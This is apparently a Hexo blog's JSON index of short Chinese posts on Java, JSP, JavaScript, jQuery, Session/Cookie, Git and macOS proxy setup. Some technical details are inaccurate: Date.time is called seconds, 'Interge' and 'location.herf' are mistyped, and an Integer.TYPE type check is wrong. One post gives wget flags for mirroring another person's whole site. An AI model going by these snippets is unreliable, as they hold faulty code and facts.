注释了怎么还能执行在调试的时候碰到了一个问题，日志里总报一个错误，怎么查都查不到原因，就在Debug模式下把会报错的代码注释掉，结果一开启Debug 还是会在注释的断点处停下 是不是见鬼了？？？Σ(￣。￣ﾉ)ﾉ 最后查到原因，是因为 在Jetty里放了较早版本生成的war包，由于同名所以还是会在相同代码区停下 因为参考文章Jetty的Target不会移动到Jetty目录下，所以说即使你注释掉代码，IDE也会优先运行Jetty服务器目录下同名的那一个，导致被注释的代码也能执行，因为打包好的那个代码是未注释状态。","tags":[{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"}]},{"title":"反射invokeException找到真正的Exception","date":"2016-08-10T02:00:00.000Z","path":"2016/08/10/反射invokeException找到真正的Exception/","text":"采用反射去调用函数当采用反射方法触发函数时(invoke)，无论被调用的method发生什么Exception，都会被包装成InvocationTargetException被抛出 123456789try &#123; ....... Method method &#x3D; ........ method.setAccessible(true); &#x2F;&#x2F;触发函数 return method.invoke(target,args);&#125; catch (InvocationTargetException e) &#123; ......&#125; 所以说如果想知道底层到底是什么错误，需要从InvocationTargetException中取出target得到真正的Exception，类似动态代理中找Target 拆包InvocationTargetException因为有时候可能是多层反射调用，所以采用while循环 12345678public static Exception getInvocationTarget(Exception exception) &#123; Throwable target &#x3D; exception; while (target instanceof InvocationTargetException) &#123; target &#x3D; ((InvocationTargetException) target).getTargetException(); &#125; return (Exception)target;&#125;","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Reflect","slug":"Reflect","permalink":"http://yoursite.com/tags/Reflect/"},{"name":"Error","slug":"Error","permalink":"http://yoursite.com/tags/Error/"}]},{"title":"int类型怎么做instanceof判断","date":"2016-08-10T01:00:00.000Z","path":"2016/08/10/int类型怎么做instanceof判断/","text":"int不是Classint 属于基本类型，并不是Class，Java对int的Class封装是Interge 如何做类型判断因为Java中int和Interge会默认在底层转换，所以说可以用instanceof做判断 123if(object instanceof Interge) &#123; int temp &#x3D; ((Integer)object).intValue();&#125; 如何获得int类型出了做判断之外，还可以通过TYPE获得int的定义 1Integer.TYPE.getClass().equals(reqObject.getClass()) 或者在反射中 1method.getreturntype 进行判断时用 1equals（Integer.type）","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"}]},{"title":"JSP调试时候不用每次都重启工程","date":"2016-08-09T13:00:00.000Z","path":"2016/08/09/JSP调试时候不用每次都重启工程/","text":"服务器容器启动启动后的界面是这样的，做了更改后除了重启启动(Rerun)还有一个更新当前资源(Update)选项，对于Web层面的更改比如JSP，Update就可以了，会比Rerun快的多","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"JSP","slug":"JSP","permalink":"http://yoursite.com/tags/JSP/"}]},{"title":"转发和重定向的区别","date":"2016-08-09T13:00:00.000Z","path":"2016/08/09/转发和重定向的区别/","text":"一句话先记清楚转发是服务器行为，重定向是前端浏览器行为 从Java代码层面分析在文章Servlet如何将Java代码逻辑变成网络URL中分析了Servlet如何处理逻辑，在doGet/doPost的函数里会有两个参数 HttpServletRequest：request会被服务器接收，进行逻辑处理 HttpServletResponse：逻辑的结果会被放入response，返回给前端 那么我们看重定向和转发的代码 12request.getRequestDispatcher().forward(); &lt;&#x3D;&#x3D;&#x3D;&#x3D; 转发是request里的功能response.sendRedirect(); &lt;&#x3D;&#x3D;&#x3D;&#x3D; 重定向是reponse里的功能 所以说转发是服务器接收的request里的函数，服务器本身就完成了，而重定向是将需要重定向的地址放入response返回给前端让浏览器自己完成 转发可以传递参数，而重定向不能传递参数重定向 ： 其实是两次request，第一次，客户端request，A服务器响应，并response回来，告诉浏览器，你应该去B，在重定向的过程中，传输到A的request信息会被丢失，因为两次request是独立的 请求转发 ： 服务器内部把对一个request/response的处理权，移交给另外一个，对于客户端而言，它只知道自己最早请求的那个A，而不知道中间的B，甚至C、D。传输的信息不会丢失。","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Servlet","slug":"Servlet","permalink":"http://yoursite.com/tags/Servlet/"}]},{"title":"Java工程需要写gitignore文件","date":"2016-08-09T12:00:00.000Z","path":"2016/08/09/Java工程需要写gitignore文件/","text":"每次Commit一大堆Modify和Xcode工程不一样，Java工程貌似每次Commit的时候会把编译的临时文件也进行commit 这样大家就没法协作了 因为每个机器生成的不一样，所以不能提交除了源代码和工程文件以外的文件 我不知道Xcode的工程怎么做到的，反正Java里可以通过写gitignore文件忽略掉这些文件 1234567891011121314151617181920#foldertarget&#x2F;#fixed file.class.exe.log.prefs.project.classpath.metadata.settings.DS_StoreThumbs.db.project*.iml*.ipr*.iws*.tar.gz.idea*.log 以上代表屏蔽掉target目录里的东西以及各种格式的文件夹","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"IDE","slug":"IDE","permalink":"http://yoursite.com/tags/IDE/"},{"name":"Git","slug":"Git","permalink":"http://yoursite.com/tags/Git/"}]},{"title":"MacOS 10.11 如何在命令行下使用Shadowsocks","date":"2016-08-09T12:00:00.000Z","path":"2016/08/09/如何在命令行下使用Shadowsocks/","text":"ShadowsocksXMac 中有个软件叫ShadowsocksX十分好用，但是有个问题比较坑爹就是命令行下无法使用，即使开了全局模式也不行 该文章在10.12.2的系统里已经失效，请参考MacOS 10.12 终端命令行下使用Shadowsocks 使用proxychains-ng无效在以往多很多教程里都推荐使用proxychains-ng在命令行里做代理，从而达到科学上网的效果，但是在Mac 10.11之后Apple 推出了一个叫 System Integrity Protection 的功能，会导致代理失效 好多解决方式是进入Recovery模式下关掉这个安全措施 如果是使用 brew install proxychains-ng 安装的话，由于没有写入权限，必须暂时关闭 SIP，安装成功之后再打开 SIP 进入 Recovery 模式，在终端执行 csrutil disable，禁止 SIP 安装完成后再次进入 Recovery 执行 csrutil enable 但是这个方法总感觉有点坑爹 正确的姿势使用ProxifierMac中还有可以根据App设置代理的软件叫Proxifier，去网上下个可用版本然后进行如下配置 添加本地端口1080的代理，因为ShadowsocksX启动的Shadowsocks服务在此端口 对需要走Shadowsocks的Application让其使用上一步1080端口的代理，然后让ShadowsocksX本身走Direct直接链接 然后在DNS里配置强制远程解析DNS (这点很重要！！一定要改) 为什么要让ShadowsocksX本身Direct如上图所示我们锁死了 Google Photos Backup 和 Terminal 这两个应用走1080端口是没问题，如果不对App加以限制的时候，就回造成任何流量都走1080端口，会造成死锁 123任意流量转发至1080 &#x3D;&#x3D;&#x3D;&#x3D;&gt; ShadowsocksX接收到任意流量 &#x3D;&#x3D;&#x3D;&#x3D;&gt; ShadowsocksX向外发出流量(这个也属于任意流量) &#x3D;&#x3D;&#x3D;&#x3D;&gt; 再次转发到1080端口 软件本身在出现这种情况的时候也会提示你进行添加","tags":[{"name":"Terminal","slug":"Terminal","permalink":"http://yoursite.com/tags/Terminal/"},{"name":"FireWall","slug":"FireWall","permalink":"http://yoursite.com/tags/FireWall/"}]},{"title":"JSP中静态资源寻址问题","date":"2016-08-09T08:00:00.000Z","path":"2016/08/09/JSP中静态资源寻址问题/","text":"JSP页面的地址问题我们根据文章 JSP地址映射 HTML/JS/CSS相对路径不同 可以得知JSP作为一种动态网页技术是可以对服务器上实际的静态资源地址做映射的，且在Web技术中不同文件的相对路径寻址机制不同 设立参考点ctx为了解决在JSP的寻址问题，可以通过JSP标签设置一个全局变量 ctx 作为该Web服务的根目录参考点， 通常和jstl核心标签放在一起，被所有文件加载 123456&lt;%-- jstl核心标签 --%&gt;&lt;%@ taglib prefix&#x3D;&quot;fn&quot; uri&#x3D;&quot;http:&#x2F;&#x2F;java.sun.com&#x2F;jsp&#x2F;jstl&#x2F;functions&quot; %&gt;&lt;%@ taglib prefix&#x3D;&quot;c&quot; uri&#x3D;&quot;http:&#x2F;&#x2F;java.sun.com&#x2F;jsp&#x2F;jstl&#x2F;core&quot; %&gt;&lt;%@ taglib prefix&#x3D;&quot;fmt&quot; uri&#x3D;&quot;http:&#x2F;&#x2F;java.sun.com&#x2F;jsp&#x2F;jstl&#x2F;fmt&quot; %&gt;&lt;%-- 当前Context的根目录赋值给ctx --%&gt;&lt;c:set var&#x3D;&quot;ctx&quot; value&#x3D;&quot;$&#123;pageContext.request.contextPath&#125;&quot;&#x2F;&gt; 使用ctx＋静态路径假设在Tomcat服务器的webapps目录下存在project.war，此时 ${ctx} ＝ /project 使用该目录左右参考点，不管Servlet中和mvc:resources中如何映射，都能找到确定的地址 相当于使用绝对路径寻址 12&lt;script src&#x3D;&quot;$&#123;ctx&#125;&#x2F;js&#x2F;util&#x2F;bug-util.js&quot;&gt;&lt;&#x2F;script&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;JSP中的书写样式&lt;script src&#x3D;&quot;&#x2F;project&#x2F;js&#x2F;util&#x2F;bug-util.js&quot;&gt;&lt;&#x2F;script&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;生成后的页面样式","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"JSP","slug":"JSP","permalink":"http://yoursite.com/tags/JSP/"}]},{"title":"JS和CSS的相对路径不同","date":"2016-08-09T07:00:00.000Z","path":"2016/08/09/JS和CSS的相对路径不同/","text":"如果存在一个HTML文件假设访问地址 1www.int.com&#x2F;html&#x2F;page 可以访问到page.html文件，而在page.html文件中进行了加载CSS文件和JS文件 12&lt;link href&#x3D;&quot;..&#x2F;css&#x2F;style.css&quot; rel&#x3D;&quot;stylesheet&quot; &#x2F;&gt;&lt;script src&#x3D;&quot;..&#x2F;js&#x2F;util.js&quot;&gt;&lt;&#x2F;script&gt; 在CSS和JS中使用相对路径CSS文件中引用了图片image01 123.icon &#123; background: url(..&#x2F;img&#x2F;image01.png) no-repeat top;&#125; JS文件中进行了相对路径跳转 12location.herf ＝ &quot;..&#x2F;index.html&quot; 以上HTML/JS/CSS的相对路径是指的哪里先说结论 JS文件的相对路径是以其宿主文件(html)为准的，而CSS是以自己为准的 根据以上假设，util.js文件的宿主是page.html，那么可以总结出下表 路径 HTML JS CSS 文件路径 www.int.com/html/page.html www.int.com/js/util.js www.int.com/css/style.css / www.int.com/ www.int.com/ www.int.com/ . www.int.com/html www.int.com/html www.int.com/css .. www.int.com/ www.int.com/ www.int.com/ 表格结论 不论哪个文件使用“／” 时都代表根目录 在使用当前目录“.”的时候，HTML是是代表自己，JS是代表宿主，所以上表中一致，CSS是代表其自己","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://yoursite.com/tags/JavaScript/"},{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"},{"name":"CSS","slug":"CSS","permalink":"http://yoursite.com/tags/CSS/"}]},{"title":"a标签中javascript:;伪协议","date":"2016-08-09T06:00:00.000Z","path":"2016/08/09/a标签中javascript伪协议/","text":"a标签使用javascript:;伪协议的目的通常我们为a标签增加href属性，一般有两个目的： 跳转到指定的页面，也就是:link选择器可以选择到它。 有href属性的a标签才有cursor：pointer的效果，特别实在低版本浏览器里面。 如果我们不想让点击a标签的时候界面产生移动，以及想让他具有cursor：pointer属性怎么办，于是就是使用伪协议 javascript:协议“javascript:” 该字符串代表高速浏览器之后的都是JS代码，而直接紧跟 “;” 就是代表JS里的代码结束，也就是不执行任何逻辑 不想要a标签跳转的几种方法12345678910111213&lt;a href&#x3D;&quot;#&quot;&gt;&lt;&#x2F;a&gt;&lt;a href&#x3D;&quot;#none&quot;&gt;&lt;&#x2F;a&gt;&lt;a href&#x3D;&quot;###&quot;&gt;&lt;&#x2F;a&gt;&lt;a href&#x3D;&quot;javascript:&quot;&gt;&lt;&#x2F;a&gt;&lt;a href&#x3D;&quot;javascript:;&quot;&gt;&lt;&#x2F;a&gt;&lt;a href&#x3D;&quot;javascript:void(0)&quot;&gt;&lt;&#x2F;a&gt;&lt;a href&#x3D;&quot;javascript :void(0);&quot;&gt;&lt;&#x2F;a&gt; 第1种，点击这个链接后，会让页面跳到页面顶部，在location.href后面增加#号。 第2种，点击这个链接后， 如果页面里面有id为none的元素，会执行锚点机制跳转到这个元素上缘。 第3种，不跳转，可以阻止默认的跳转行为，但是这个在后端代码中容易识别成注释，后面的代码不显示，之前遇到过这种坑，之后再没用过。 后面几种使用了javascript伪协议 参考文章1.javascript伪协议","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://yoursite.com/tags/JavaScript/"},{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"}]},{"title":"DOM对象中firstChild和firstElementChild的区别","date":"2016-08-09T04:00:00.000Z","path":"2016/08/09/DOM对象中firstChild和firstElementChild的区别/","text":"DOM对象中firstChild和firstElementChild的区别参考文章DOM对象中的Node和Element的区别可以知道DOM中分为Node和Element，所以说 firstChild是取第一个Node，firstElementChild是取第一个Element","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://yoursite.com/tags/JavaScript/"},{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"}]},{"title":"DOM对象中的Node和Element的区别","date":"2016-08-09T01:00:00.000Z","path":"2016/08/09/DOM对象中的Node和Element的区别/","text":"DOM对象根据JS中DOM对象的描述，DOM内部分为Node和Element，并且放入了两个不同的数组 childNodes 和 children 1234567891011......childElementCount:0 &lt;&#x3D;&#x3D;&#x3D;&#x3D; 内部的元素childNodes:NodeList[1] &lt;&#x3D;&#x3D;&#x3D;&#x3D; 内部的节点children:HTMLCollection[0]......firstChild:text &lt;&#x3D;&#x3D;&#x3D;&#x3D; 标签内部有文本firstElementChild:null &lt;&#x3D;&#x3D;&#x3D;&#x3D; 该项为null表示标签内部不再有&lt;&gt;元素 什么是Node什么是Element只要是有字符空间存在(哪怕是空字符)就是Node，带有&lt;&gt;标签标记的才是Element,Node里包括Element 如何计算Node和Element假设存在一个DOM对象,它有几个Node和几个Element呢 1234567&lt;div&gt; Text &lt;span&gt; SpanText &lt;&#x2F;span&gt;&lt;&#x2F;div&gt; div中有3个Node ＝ 文本Text是Node[0]，span标签是Node[1] 第三个Node在span结束标签和div结束标签之间，虽然是空字符，但是有空间，所以是Node[2] div中有1个Element ＝ span标签Element[0] 所以说div的各种属性是 标签 childElementCount childNodes children div 1 NodeList[3] HTMLCollection[1] span中有1个Node ＝ 文本SpanText是Node[0] span里没有Element了，因为不包含任何标签 所以说span的各种属性是 标签 childElementCount childNodes children span 0 NodeList[1] HTMLCollection[0]","tags":[{"name":"JavaScript","slug":"JavaScript","permalink":"http://yoursite.com/tags/JavaScript/"},{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"}]},{"title":"JQuery对象和DOM对象区别和转化","date":"2016-08-09T01:00:00.000Z","path":"2016/08/09/JQuery对象和DOM对象区别和转化/","text":"JQuery对象和DOM对象的联系DOM对象是JavaScript源生提供对HTML的DOM进行模型化的一个对象，JQuery对象是对该对象进行了封装，并且添加了JQuery方法等 DOM对象长什么样DOM对象是一个及其复杂的对象，其详细描述了该HTML的状态，摘取一部分如下 1234567891011121314151617181920212223accessKey:&quot;&quot;attributes:NamedNodeMapautofocus:falsebaseURI:&quot;http:&#x2F;&#x2F;localhost:8080&#x2F;psas&#x2F;bug&#x2F;submit&quot;childElementCount:0 &lt;&#x3D;&#x3D;&#x3D;&#x3D; 内部的元素childNodes:NodeList[1] &lt;&#x3D;&#x3D;&#x3D;&#x3D; 内部的节点children:HTMLCollection[0]classList:DOMTokenList[0]......firstChild:text &lt;&#x3D;&#x3D;&#x3D;&#x3D; 标签内部有文本firstElementChild:null &lt;&#x3D;&#x3D;&#x3D;&#x3D; 该项为null表示标签内部不再有&lt;&gt;元素form:nullhidden:falseid:&quot;bug-level&quot;innerHTML:&quot;↵ &quot; &lt;&#x3D;&#x3D;&#x3D;&#x3D; 内部的HTML文本，包括换行符innerText:&quot;&quot; &lt;&#x3D;&#x3D;&#x3D;&#x3D; 内部的字符串文本，不包括换行符......__proto__:HTMLSelectElement &lt;&#x3D;&#x3D;&#x3D;&#x3D; 所有的HTML方法都保存在里面 JQuery对象长什么样JQuery对象是由一组DOM对象和若干JQuery信息和方法组成的，因为在使用JQuery选择器的时候可以选择出一组的DOM而不是一个 12345678JQueryObject:init[2] 0:div#id-1 &lt;&#x3D;&#x3D;&#x3D;&#x3D;第一个DOM对象 1:div#id-2 &lt;&#x3D;&#x3D;&#x3D;&#x3D;第二个DOM对象 context:document &lt;&#x3D;&#x3D;&#x3D;&#x3D; 当前的文档属性 length:2 &lt;&#x3D;&#x3D;&#x3D;&#x3D; 内部有几个DOM对象 prevObject:init[1] &lt;&#x3D;&#x3D;&#x3D;&#x3D; 前一个JQuery对象！这里前一个也是JQuery对象注意 selector:&quot;div#JQueryObject&quot; &lt;&#x3D;&#x3D;&#x3D;&#x3D;选择器 __proto__:Object[0] &lt;&#x3D;&#x3D;&#x3D;&#x3D;JQuery方法 JQuery对象和DOM对象如何转换JQuery ====&gt; DOM由于DOM对象被包在JQuery中，所以两种转换方式将一个JQuery对象转换成DOM对象：[index]和.get(index) 12var DOM &#x3D; $(&quot;div#id&quot;)[0]var DOM &#x3D; $(&quot;div#id&quot;).get(0) DOM ====&gt; JQuery一个DOM对象，只需要用$()把DOM对象包装起来，就可以获得一个JQuery对象从而使用JQuery方法 相当于拿DOM对象初始化了一个JQuery对象 1var JQuery &#x3D; $(DOM)","tags":[{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"},{"name":"JQuery","slug":"JQuery","permalink":"http://yoursite.com/tags/JQuery/"}]},{"title":"JQuery隐藏和显示DOM","date":"2016-08-08T05:00:00.000Z","path":"2016/08/08/JQuery隐藏和显示DOM/","text":"JQuery中的toggletoggle可以切换DOM的显示状态，隐藏的变显示，显示的隐藏 1$(&quot;div#id&quot;).toggle() toggle作用于CSS中声明 display:none 的元素（但不适用于 visibility:hidden 的元素） 显示1$(&quot;div#id&quot;).show() 隐藏1$(&quot;div#id&quot;).hide()","tags":[{"name":"FrontEnd","slug":"FrontEnd","permalink":"http://yoursite.com/tags/FrontEnd/"},{"name":"JQuery","slug":"JQuery","permalink":"http://yoursite.com/tags/JQuery/"}]},{"title":"Session和Cookie的区别和定义","date":"2016-08-08T04:00:00.000Z","path":"2016/08/08/Session和Cookie的区别和定义/","text":"Session是什么在Java服务器中，Session是一个Java的Class， 是服务器内存中的一个概念 1javax.servlet.http.HttpSession; 每一个Session是一个实例化的对象，内部有个Map可以通过键值对保存数据 Cookie是什么参考文章 HTTP报文基本概念 可知道 Cookie是HTTP请求中的一个概念 Cookie是HTTP报文头的一部分，内部是Key-Value键值对来储存数据的 Session和Cookie的关系从上文得知Session和Cookie压根是两个领域的概念 那么他们之间有什么关系呢 在HTTP的概念中可以得知HTTP报文是短连接报文，每一次是由一个Request和一个Response组成，两次请求之间没有关系。 那么当我们使用浏览器时，首先坐了用户登录，然后进行了一系列操作 那么问题来了 服务器如何知道我们多次操作是来自同一个用户(浏览器）的呢？ 答案就是Session和Cookie两个机制共同作用，用来完成操作来源者但识别工作 Session的职能 服务器收到一个新请求 检查Cookie中是否有Session字段(SessionID) 此时会有两种情况，第一次请求 没有Session字段，此时服务器容器new Session() new出的Session会生成一个SessionID SessionId被通过Response中但Set-Cookie字段放到HTTP的返回中 第二次请求 发现SessionID，找到服务器中已经被实例化的Session 由于找到了Session，所以可以使用Session中保存的数据 Cookie的职能 浏览器发出请求，带走当前域下浏览器缓存区里所有Cookie 浏览器得到返回报文，从Set-Cookie字段里取出所有Cookie放入当前域缓存 Session与Cookie的协同作用通过Session和Cookie但职能描述我们发现 Cookie只是一个传递手段，每次HTTP请求都不关心其中的内容 服务器如何判断是不是同一来源的请求，依赖于Cookie有没有保存Session的字段SessionID 也就是说 第一次请求时，Cookie中没有SessionID，服务器会生成，然后放入Response报文返回到浏览器里，之后的请求浏览器会发送带有SessionID的Cookie，所以服务器可以判断出是否来自同一来源 Session与Cookie中的一些混淆的概念Q:程序员常说的”从Cookie中取出Session”是什么A: 这句话的完成表达是 “从服务器当前域下的Cookie中取出SessionID” Q:Session里的数据能不能被浏览器读取到A: Session是服务器的概念，存在于服务器的内存中，只是其一个参数SessionID被放入了Cookie，所以说Map中的数据不会出现在HTTP报文中，只有前端拿着这个SessionID跑到服务器来，在服务器的逻辑中才能取到Session中的数据 Q:我A网站的Session会不会被带到B网站A: 在浏览器中有个域的概念，不同的网站有不同的缓存空间，你在A网站下发送的HTTP请求，只能从自己的缓存空间里拿Cookie，拿不到B的Cookie，自然也就读不到B的SessionID，但是如果浏览器本身就被人修改过就不一定了。这里牵扯到了网络安全的基本知识，细节请自行学习。 Q:Session和用户是否登录有关系么？A: Session是服务器管理HTTP链接的一个机制，和用户登录不登录没有关系，用户登录是在该机制上层业务层的一个东西，不管是否登录都有Session存在，无非是生成的Session中是否包涵的登录信息。 简单来说如果用户登录成功，生成的SessionID为11位，如果没有成功生成SessionID是10位，那么当Session返回服务端的时候，通过判断位数就可以验证用户当前是登录还是未登录的逻辑。(实际应用中并不会这么简单，SessionID的生成逻辑更复杂) Q:Session可以自定义么A: Session是可以自定义的，不一定使用javax.servlet.http.HttpSession，甚至和HTTP也没关系，它本身仅仅是一种状态保持逻辑，比如Spring有自己的Session类，Shiro也有自己的Session，用错甚至会引发问题","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Net","slug":"Net","permalink":"http://yoursite.com/tags/Net/"},{"name":"Server","slug":"Server","permalink":"http://yoursite.com/tags/Server/"},{"name":"Session","slug":"Session","permalink":"http://yoursite.com/tags/Session/"},{"name":"Cookie","slug":"Cookie","permalink":"http://yoursite.com/tags/Cookie/"}]},{"title":"wget抓全站","date":"2016-08-08T04:00:00.000Z","path":"2016/08/08/wget抓全站/","text":"想抄人家的网站1234wget [参数列表] [目标软件、网页的网址]wget -r -p -np -k -E http:&#x2F;&#x2F;www.xxx.com 抓取整站wget -l 1 -p -np -k -E http:&#x2F;&#x2F;www.xxx.com 抓取第一级 -r 递归抓取-k 抓取之后修正链接，适合本地浏览-E 增加html扩展名 具体的参数名称去看man指令吧","tags":[{"name":"Shell","slug":"Shell","permalink":"http://yoursite.com/tags/Shell/"},{"name":"Terminal","slug":"Terminal","permalink":"http://yoursite.com/tags/Terminal/"}]},{"title":"lombok下重写Set/Get函数","date":"2016-08-08T02:00:00.000Z","path":"2016/08/08/lombok下重写SetGet函数/","text":"使用lomboklombok可以用注解生成Setter和Getter函数，从而简化代码量 重写不同类型set函数如果我想让某个参数有2种赋值方式，比如Integer类型但loginIp， 12345678@Getter@Setter@ToStringpublic class Object ｛private Integer loginIp;｝ 在使用了@Setter注解后，此时会隐性生成该函数 123public void setLoginIp(Integer loginIp) &#123; this.loginIp &#x3D; loginIp;&#125; 如果我此时想有一种String的赋值函数,同名不同参， 此时就要手动再写一遍setLoginIp(Integer loginIp) 不然该函数不存在 123public void setLoginIp(String loginIp) &#123; this.loginIp &#x3D; DataConvertUtil.StringIPv4ToIntegerGoogle(loginIp);&#125; 结论： lombok只对函数名进行检测，如果存在了setLoginIp的函数名，@Setter注解就不会再生成","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"}]},{"title":"前后端中的Date类型转换","date":"2016-08-08T02:00:00.000Z","path":"2016/08/08/前后端中的Date类型转换/","text":"Java/JSP/JS中的Date在Java/JSP/JavaScript中都有Date类型 Date所在地 Date类型 Java中Date java.util.Date JSP中fmt:formatDate JSP标签，可接收java.util.Date JS中Date JavaScript的Date对象和java.util.Date没关系 JavaScript中的Date虽然和Java没一毛钱关系，但是也可以用java.util.Date进行直接初始化 前端页面JS到后台Controller从前端可以通过字符串的形式发送Date到后台，然后使用Spring的参数绑定接收 JS请求参数 1｛&quot;addDate&quot;:&quot;2016-08-01&quot;｝ Spring参数绑定接收 12@DateTimeFormat(pattern &#x3D; &quot;yyyy-MM-dd&quot;)private Date addDate; 后台Controller到JSP通过Model放入JSP 1model.addAttribute(&quot;addDate&quot;,addDate); JSP中格式化取出，如果不进行格式化，是输出的Date.toString()的字符串 123&lt;span&gt; &lt;fmt:formatDate value&#x3D;&quot;$&#123;addDate&#125;&quot; pattern&#x3D;&quot;yyyy-MM-dd&quot;&#x2F;&gt;&lt;&#x2F;span&gt; Ajax到JS如果是通过Jquery的Ajax发送请求得到返回的Date类型，在JS中会被接收成一个JavaScript的Date 比如2016-08-08 15:57:45这个日期 12345678910testDate:Object date:8 &lt;&#x3D;&#x3D;8日 day:1 &lt;&#x3D;&#x3D;星期一 hours:15 &lt;&#x3D;&#x3D;15时 minutes:57 &lt;&#x3D;&#x3D;57分 month:7 &lt;&#x3D;&#x3D;代表8月 seconds:45 &lt;&#x3D;&#x3D;45秒 time:1470643065785 &lt;&#x3D;&#x3D;从1970年到现在的秒数 timezoneOffset:-480 &lt;&#x3D;&#x3D;时区 year:116 &lt;&#x3D;&#x3D;代表2016年 其中不便于让人理解的是 month 和 year 的数值，在JS中 month: 月份是从0开始到11结束，分别代表1-12月 year : 年份是从1900年作为基点到目前的时间，所以2016年是 1900+116 JSP传递到JS在JSP中，如果直接取值 ${addDate} 得到是Date.toString()的输出字符串 1Wed Jul 06 00:00:00 CST 2016 可以通过该字符串实例化一个JavaScript的Date对象，例如 12var date &#x3D; new Date(&quot;$&#123;addDate&#125;&quot;); &lt;&#x3D;&#x3D;&#x3D;&#x3D;JSP文件中的样子var date &#x3D; new Date(&quot;Wed Jul 06 00:00:00 CST 2016&quot;); &lt;&#x3D;&#x3D;&#x3D;&#x3D;返回的HTML中实际的样子 JavaScript中的Date类型JavaScript的Date 可以直接用Java的Date字符串进行实例化 ，其数据结构为 12345678910111213var Date &#x3D; &#123; var date, day, hours, minutes, month, seconds, time, timezoneOffset, year .....&#125; 对于其中的参数提供了各种Get方法，其中需要注意的有以下几个 getFullYear() : 这个是获得当前的绝对年份，比如2016 getYear() : 这个是获得Year的值，比如2016年是相对1900年的116 getMonth(): 这个获得是当前月份减去1，原因是因为0－11代表1-12月","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"JavaScript","slug":"JavaScript","permalink":"http://yoursite.com/tags/JavaScript/"},{"name":"JSP","slug":"JSP","permalink":"http://yoursite.com/tags/JSP/"},{"name":"Parameter","slug":"Parameter","permalink":"http://yoursite.com/tags/Parameter/"}]},{"title":"Spring的参数转换/空参数/日期/400错误","date":"2016-08-08T01:00:00.000Z","path":"2016/08/08/Spring的参数转换空参数日期400错误/","text":"Spring的参数绑定Spring会将提交的参数绑定到同名的参数上，包括Object内部的参数，详情参见教程Spring参数绑定 400错误是什么如果参数绑定出错，返回的错误代码是400，比如input输入了一个String，结果Java中同名参数是Integer类型 所以说在书写的过程中，如果碰到400错误，就可以肯定是参数传递出了问题 前端输入和数据库数值分离例如用户性别分为男女，而数据库想采用0，1的方式存储，可以使用Spring提供的Formatter、Converter来完成这项工作 空输入的不同如果前端的input什么都不写进行提交，Spring会根据参数的Java类型不同绑定为不同的结果 参数Java类型 绑定结果 String “”空字符串 Integer null 接收Date类型可以使用Spring的注解 1@DateTimeFormat( pattern &#x3D; &quot;yyyy-MM-dd&quot; ) 接受日期类型，其中pattern是前端日期的字符串格式，有些文章中提到由于该注解用到了Joda.time的包，所以要引入 我测试了一下，并不需要 关于前后端日期的总结参考文章Java,JSP,JS中的Date","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"Spring","slug":"Spring","permalink":"http://yoursite.com/tags/Spring/"}]},{"title":"JSP中输出变量值为HTML文本和<%＝%>的坑","date":"2016-08-05T07:00:00.000Z","path":"2016/08/05/JSP中输出变量值为HTML文本和坑/","text":"Java输出变量的方式Java中有三种方式可以将Java的变量值变成文本输出到JSP文件中,机制不同，但是效果一样 通过Java代码块取值1&lt;%&#x3D;object %&gt; 通过JSP标签取值12&lt;c:out value&#x3D;&quot;object&quot;&#x2F;&gt; 通过$符号1$&#123;object&#125; &lt;%＝%&gt;的坑在使用&lt;%=%&gt;取值 不能加空格 ，不然取不出来 12&lt;%&#x3D;object %&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;正确&lt;% &#x3D;object %&gt; &lt;&#x3D;&#x3D;&#x3D;&#x3D;错误","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"JSP","slug":"JSP","permalink":"http://yoursite.com/tags/JSP/"}]},{"title":"JSP页面从Java文件取值","date":"2016-08-05T06:00:00.000Z","path":"2016/08/05/JSP页面从Java文件取值/","text":"JSP页面从Java文件取值同Java中的import文件一样，我们知道JSP其实最后也是Java文件，所以可以使用page标签里的import加载Java文件 1&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; import&#x3D;&quot;com.company.project.Constants&quot; %&gt; 然后在Jsp中就可以使用Java代码快取值 1&lt;%&#x3D;Constants.SERVICE_USER_STATUS_FLAG_NORMAL%&gt; 或者赋值给JSP局部变量 12&lt;c:set var&#x3D;&quot;userRoleSu&quot; value&#x3D;&quot;&lt;%&#x3D;Constants.SERVICE_USER_STATUS_FLAG_NORMAL%&gt;&quot;&#x2F;&gt;","tags":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/tags/Java/"},{"name":"JSP","slug":"JSP","permalink":"http://yoursite.com/tags/JSP/"}]},{"title":"Controller传值给JSP页面","date":"2016-08-01T14:00:00.000Z","path":"2016/08/01/Controller传值给JSP页面/","text":"Controller传值给JSP页面Spring把结束逻辑结果传给JSP界面，有两种方法 利用Spring自身的Model传参机制 利用服务器的Session机制 